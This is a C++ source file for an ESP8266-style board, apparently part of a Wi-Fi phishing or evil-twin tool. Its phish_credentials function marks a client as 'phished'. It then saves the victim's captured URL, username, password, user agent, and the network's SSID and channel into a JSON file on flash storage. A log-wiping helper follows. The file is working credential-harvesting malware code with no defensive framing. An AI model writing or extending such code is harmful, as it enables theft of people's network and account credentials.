#include <FS.h>
#include <ArduinoJson.h>

void start_spi() {
    SPIFFS.begin();

    File file = SPIFFS.open("/log", "a");
    file.close();

    File file_2 = SPIFFS.open("/phishing-logs", "a");
    file_2.println("[]");
    file_2.close();
}

void logging(const char* log) {
    File file = SPIFFS.open("/log", "a");
    if(!file) {
        Serial.println("Could not creat log file");
    }
    Serial.print(log);

    if(file.println(log)) {
        Serial.println(" ++");
    } else {
        Serial.println(" --- Log write failed ---");
    }

    file.close();
}

void phish_credentials(String url_auth, String user_auth, String password_auth, String user_agent_auth) {
    station_phished = 1;
    logging("Phish Credentials :: CLIENT PHISHED");
    logging("Load Settings :: Opening config json file");

    File f = SPIFFS.open("/phishing-logs", "r");

    size_t size = f.size();
    std::unique_ptr<char[]> buf(new char[size]);
    f.readBytes(buf.get(), size);

    DynamicJsonBuffer jsonBuffer(size);
    JsonArray& array = jsonBuffer.parseArray(buf.get());

    array.prettyPrintTo(Serial);
    f.close();

    JsonObject& object = array.createNestedObject();
    object["url"] = url_auth;
    object["ssid"] = ssid;
    object["hidden"] = hidden;
    object["channel"] = channel;
    object["user"] = user_auth;
    object["password"] = password_auth;
    object["user_agent"] = user_agent_auth;

    File file = SPIFFS.open("/phishing-logs", "w");
    array.printTo(file);
    array.prettyPrintTo(Serial);
    file.close();
}

void wipe_log(const char *file, const char *empty){
    SPIFFS.remove(file);
    File f = SPIFFS.open(file, "a");
    f.println(empty);
    f.close();
}